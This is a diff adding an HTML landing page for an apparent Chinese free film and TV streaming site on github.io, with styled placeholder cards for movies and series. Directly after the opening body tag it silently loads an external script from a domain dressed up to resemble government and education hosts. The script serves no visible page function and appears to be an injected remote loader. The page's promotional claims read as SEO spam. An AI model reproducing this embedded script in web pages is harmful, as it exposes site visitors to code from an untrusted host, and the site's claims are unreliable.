@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>影视娱乐 - 高清影视综艺在线观看首选</title>
+    <meta name="description" content="影视娱乐(yingshiyule-h5.github.io)汇集最新电影、热播剧集、综艺娱乐、动漫资讯，提供高清流畅的在线观看体验，一站式娱乐平台。">
+    <meta name="keywords" content="影视娱乐, yingshiyule, 电影, 电视剧, 综艺, 在线观看">
+    <style>
+        /* 基础重置 */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif; background: #0a0a0f; color: #e0e0e0; line-height: 1.6; overflow-x: hidden; }
+        a { text-decoration: none; color: #fff; }
+        
+        /* 栏目1：导航栏 - 玻璃拟态 (Glassmorphism) */
+        .navbar { position: fixed; top: 0; width: 100%; padding: 1rem 5%; background: rgba(10, 10, 15, 0.7); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); z-index: 1000; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .logo { font-size: 1.8rem; font-weight: 900; background: linear-gradient(45deg, #ff6ec4, #7873f5); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .nav-links { display: flex; gap: 2rem; }
+        .nav-links a { font-size: 0.95rem; font-weight: 500; transition: color 0.3s; }
+        .nav-links a:hover { color: #ff6ec4; }
+
+        /* 栏目2：Hero 首屏 - 居中布局 + 发光背景球 */
+        .hero { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 0 1rem; position: relative; }
+        .hero::before { content: ''; position: absolute; top: 20%; left: 50%; transform: translateX(-50%); width: 400px; height: 400px; background: radial-gradient(circle, rgba(120,115,245,0.25) 0%, transparent 70%); z-index: 0; pointer-events: none; }
+        .hero-content { position: relative; z-index: 1; max-width: 800px; margin-top: 3rem; }
+        .hero h1 { font-size: 4rem; margin-bottom: 1.2rem; font-weight: 900; letter-spacing: 2px; color: #fff; }
+        .hero p { font-size: 1.2rem; color: #a0a0b0; margin-bottom: 2.5rem; }
+        .hero-btn { display: inline-block; padding: 1rem 2.8rem; background: linear-gradient(45deg, #ff6ec4, #7873f5); border-radius: 50px; font-weight: bold; font-size: 1.1rem; transition: transform 0.3s, box-shadow 0.3s; }
+        .hero-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(255,110,196,0.35); }
+
+        /* 栏目3：热门电影 - 横向滚动 Flex 结构 (差异化点) */
+        .movies-section { padding: 5rem 0 5rem 5%; background: #0f0f16; }
+        .section-header { margin-bottom: 2rem; padding-right: 5%; display: flex; justify-content: space-between; align-items: flex-end; }
+        .section-title { font-size: 2rem; color: #fff; position: relative; padding-left: 1rem; }
+        .section-title::before { content: ''; position: absolute; left: 0; top: 0; height: 100%; width: 4px; background: #ff6ec4; border-radius: 2px; }
+        .scroll-container { display: flex; gap: 1.5rem; overflow-x: auto; padding-right: 5%; scroll-snap-type: x mandatory; }
+        .scroll-container::-webkit-scrollbar { display: none; } /* 隐藏滚动条 */
+        .movie-card { flex: 0 0 280px; scroll-snap-align: start; background: #1a1a24; border-radius: 12px; overflow: hidden; transition: transform 0.3s; }
+        .movie-card:hover { transform: scale(1.03); }
+        .movie-poster { width: 100%; height: 160px; background: linear-gradient(45deg, #2a2a35, #1a1a24); display: flex; align-items: center; justify-content: center; color: #555; font-size: 1rem; }
+        .movie-info { padding: 1.2rem; }
+        .movie-info h3 { font-size: 1.1rem; margin-bottom: 0.5rem; color: #fff; }
+        .movie-info p { font-size: 0.85rem; color: #888; }
+
+        /* 栏目4：热播剧集 - 左右交错 Flex 结构 (差异化点) */
+        .series-section { padding: 5rem 5%; background: #0a0a0f; }
+        .series-list { display: flex; flex-direction: column; gap: 2rem; max-width: 900px; margin: auto; }
+        .series-item { display: flex; align-items: center; gap: 2rem; background: #121218; padding: 1.5rem; border-radius: 16px; border: 1px solid #222; transition: border-color 0.3s; }
+        .series-item:hover { border-color: #7873f5; }
+        .series-item:nth-child(even) { flex-direction: row-reverse; }
+        .series-img { flex: 0 0 200px; height: 140px; background: #1f1f2e; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #666; font-size: 0.9rem; }
+        .series-text { flex: 1; }
+        .series-text h3 { font-size: 1.3rem; color: #7873f5; margin-bottom: 0.8rem; }
+        .series-text p { color: #999; margin-bottom: 1rem; font-size: 0.95rem; }
+        .series-text a { color: #ff6ec4; font-size: 0.9rem; border-bottom: 1px solid transparent; transition: border-color 0.3s; }
+        .series-text a:hover { border-color: #ff6ec4; }
+
+        /* 栏目5：关于与数据 - 3列 Grid 结构 */
+        .about-section { padding: 5rem 5%; background: #0f0f16; }
+        .about-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 2rem; max-width: 1200px; margin: auto; }
+        .about-card { background: #15151e; padding: 2.5rem 2rem; border-radius: 12px; text-align: center; transition: background 0.3s; }
+        .about-card:hover { background: #1a1a26; }
+        .about-card h3 { color: #fff; margin-bottom: 1rem; font-size: 1.2rem; }
+        .about-card p { color: #888; font-size: 0.9rem; margin-bottom: 1.5rem; }
+        .about-card .stat { font-size: 2.5rem; font-weight: bold; background: linear-gradient(45deg, #ff6ec4, #7873f5); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.5rem; }
+
+        /* 底部 */
+        footer { padding: 3rem 1rem; text-align: center; background: #050508; color: #666; border-top: 1px solid #111; }
+        footer p { margin-bottom: 0.5rem; }
+        footer a { color: #7873f5; transition: color 0.3s; }
+        footer a:hover { color: #ff6ec4; }
+
+        /* 移动端自适应 */
+        @media (max-width: 768px) {
+            .nav-links { display: none; } /* 移动端隐藏常规导航，保持单页简洁 */
+            .hero h1 { font-size: 2.5rem; }
+            .hero::before { width: 250px; height: 250px; }
+            .series-item, .series-item:nth-child(even) { flex-direction: column; text-align: center; }
+            .series-img { width: 100%; flex: none; }
+            .about-grid { grid-template-columns: 1fr; }
+            .scroll-container { padding-right: 1rem; }
+            .movies-section { padding-left: 1rem; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+    <!-- 导航 -->
+    <nav class="navbar">
+        <div class="logo">影视娱乐</div>
+        <div class="nav-links">
+            <a href="#">首页</a>
+            <a href="#">热门电影</a>
+            <a href="#">热播剧集</a>
+            <a href="#">关于平台</a>
+        </div>
+    </nav>
+
+    <!-- 首屏 -->
+    <section class="hero">
+        <div class="hero-content">
+            <h1>影视娱乐</h1>
+            <p>欢迎访问影视娱乐（yingshiyule-h5.github.io），您的专属高清影视娱乐导航。海量电影、剧集、综艺，一页直达，极速体验。</p>
+            <a href="#" class="hero-btn">开启娱乐之旅</a>
+        </div>
+    </section>
+
+    <!-- 热门电影：横向滚动 -->
+    <section class="movies-section">
+        <div class="section-header">
+            <h2 class="section-title">热门电影</h2>
+        </div>
+        <div class="scroll-container">
+            <div class="movie-card">
+                <div class="movie-poster">电影海报</div>
+                <div class="movie-info"><h3>星际穿越2</h3><p>科幻 / 冒险 · 2026</p></div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">电影海报</div>
+                <div class="movie-info"><h3>暗夜追凶</h3><p>悬疑 / 犯罪 · 2026</p></div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">电影海报</div>
+                <div class="movie-info"><h3>夏日乐悠悠</h3><p>爱情 / 喜剧 · 2025</p></div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">电影海报</div>
+                <div class="movie-info"><h3>极地求生</h3><p>动作 / 冒险 · 2026</p></div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">电影海报</div>
+                <div class="movie-info"><h3>动画狂欢</h3><p>动漫 / 家庭 · 2026</p></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 热播剧集：左右交错 -->
+    <section class="series-section">
+        <h2 class="section-title" style="margin-bottom: 2rem; text-align: center;">热播剧集</h2>
+        <div class="series-list">
+            <div class="series-item">
+                <div class="series-img">剧集封面</div>
+                <div class="series-text">
+                    <h3>庆余年 第三季</h3>
+                    <p>范闲重返京都，朝堂与江湖的风云再起，权谋与武侠的巅峰对决，带你领略不一样的古代传奇。</p>
+                    <a href="#">查看详情 #</a>
+                </div>
+            </div>
+            <div class="series-item">
+                <div class="series-img">剧集封面</div>
+                <div class="series-text">
+                    <h3>长相思 2</h3>
+                    <p>小夭与涂山璟、相柳的情感纠葛，在乱世中寻找归宿的唯美神话，剧情跌宕起伏。</p>
+                    <a href="#">查看详情 #</a>
+                </div>
+            </div>
+            <div class="series-item">
+                <div class="series-img">剧集封面</div>
+                <div class="series-text">
+                    <h3>警察荣誉 2</h3>
+                    <p>基层派出所的新人成长记，笑中带泪的写实职场剧，展现平凡民警的不平凡故事。</p>
+                    <a href="#">查看详情 #</a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 关于/数据：3列Grid -->
+    <section class="about-section">
+        <div class="about-grid">
+            <div class="about-card">
+                <div class="stat">10,000+</div>
+                <h3>海量片库</h3>
+                <p>影视娱乐汇聚全网高清资源，从经典老片到最新院线，一网打尽，满足您的观影需求。</p>
+            </div>
+            <div class="about-card">
+                <div class="stat">24H</div>
+                <h3>极速更新</h3>
+                <p>同步全球影视资讯，每日更新热门剧集与综艺节目，第一时间奉上精彩内容。</p>
+            </div>
+            <div class="about-card">
+                <div class="stat">100%</div>
+                <h3>免费畅享</h3>
+                <p>无需注册，打开 yingshiyule-h5.github.io 即可免费在线观看，纯净无广告干扰。</p>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>© 2026 影视娱乐 (yingshiyule-h5.github.io). All Rights Reserved.</p>
+        <p>网站地址：<a href="https://yingshiyule-h5.github.io">https://yingshiyule-h5.github.io</a></p>
+        <p>核心关键词：影视娱乐 | 高清电影 | 在线观看 | yingshiyule</p>
+    </footer>
+
+</body>
+</html>
